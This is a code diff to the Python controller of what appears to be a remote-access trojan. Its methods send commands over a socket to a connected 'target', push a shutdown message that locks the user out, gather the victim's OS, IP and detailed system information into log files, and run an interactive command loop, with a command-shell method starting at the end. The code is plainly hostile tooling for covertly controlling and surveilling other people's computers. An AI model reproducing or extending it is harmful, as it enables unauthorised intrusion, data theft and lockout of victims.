@@ -184,6 +184,7 @@ class Server:
         else:
             print("Something went Wrong")
         print(status)
+
     def playchess(self):
         command = "-Chess"
         self.client_socket.send(command.encode("utf-8"))
@@ -337,70 +338,95 @@ class Server:
     def shutdownmessage(self):
         command = "-shutdownM"
         self.client_socket.send(command.encode("utf-8"))
+        msg = input("[+] Enter message: ")
+        time.sleep(2)
+        self.client_socket.send(msg.encode())
+        print(msg)
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        print(results)
 
         self.client_socket.close()
         print(f"[!] {self.address[0]} has been Shut Down")
 
         # locks the user out while keeping connection up
 
-    def systeminfo(self):
 
+    def getTargetInfo(self):
+        print("here")
+        # command = "--ginfo"
+        # self.client_socket.send(command.encode("utf-8"))
 
+        info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print("info = " + info)
+        more = self.client_socket.recv(self.BUFFER_SIZE)
+        print("more = " + str(more))
+        ##### EVEN MORE IS LARGER THAN BUFFER SIZE ######
+        emsize = self.client_socket.recv(self.BUFFER_SIZE).decode("UTF-8")
+        print("emsize =" + str(emsize))
+        if int(emsize) >= self.BUFFER_SIZE:
+            print("bigboi")
+            buff = self.updateBuffer(emsize)
+            print("buffer = " + str(buff))
+            evenmore = self.saveBigFile(int(emsize), buff)
+            print("evenmore =" + str(evenmore))
+        else:
+            evenmore = self.client_socket.recv(self.BUFFER_SIZE)
+        moresysinfo = input("Would you like to see more?: ")
+        if moresysinfo == "yes":
+            print(more.decode())
 
+        print(moresysinfo + "\n\n")
+        """ writing additional information in a file """
 
+        with open('../receivedfile/info.txt', 'wb+') as f, open('./logs/moreinfoS.txt', 'wb+') as m:
+            f.write(more)
+            m.write(evenmore)
+            print("DONE")
+        # with open('./logs/moreinfoS.txt', "rb+") as m:
+        # print(m.read())
+        print("\n# OS:" + info)
+        print("# IP:" + self.address[0])
+        print("*** Check info.txt for more details on the target ***")
+        print("**** Check moreinfo.txt for even more details on the target ****")
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+        return info
 
 
     def commands(self):
-        # os.system("clear")
-        while True:
-         # get the command from prompt
-            command = input("Enter the command you want to execute:")
-            # send the command to the client
-            print(command)
-            # self.client_socket.send(command.encode())
+            # os.system("clear")
+            while True:
+             # get the command from prompt
+                command = input("Enter the command you want to execute:")
+                # send the command to the client
+                print(command)
+                # self.client_socket.send(command.encode())
 
-            if command == "exit":
-                # if the command is exit, just break out of the loop
-                break
-            else:
-                try:
-                    func = self.Switcher.get(command)
-                    func()
-                except TypeError:
-                    print("This operation does not exist. ")
-                except ConnectionResetError:
-                    """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """
+                if command == "exit":
+                    # if the command is exit, just break out of the loop
+                    break
+                else:
+                    try:
+                        func = self.Switcher.get(command)
+                        func()
+                    except TypeError:
+                        print("This operation does not exist. ")
+                    except ConnectionResetError:
+                        """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """
 
-                    print("[!] Connection Reset Error")
-                    #self.closeConnection()
-                except KeyboardInterrupt:
-                    print("\n[ STOPPED RECEIVING DATA ]")
-                except Exception as e:
-                    print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))
+                        print("[!] Connection Reset Error")
+                        #self.closeConnection()
+                    except KeyboardInterrupt:
+                        print("\n[ STOPPED RECEIVING DATA ]")
+                    except Exception as e:
+                        print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))
 
-        sys.exit()
-        # close connection to the client
-        self.client_socket.close()
-        # close server connection
-        self.close()
+            sys.exit()
+            # close connection to the client
+            self.client_socket.close()
+            # close server connection
+            self.close()
 
-        print(results)
+            print(results)
 
     def cmdctrl(self):
         """ This is not a real interactive shell, you get the output
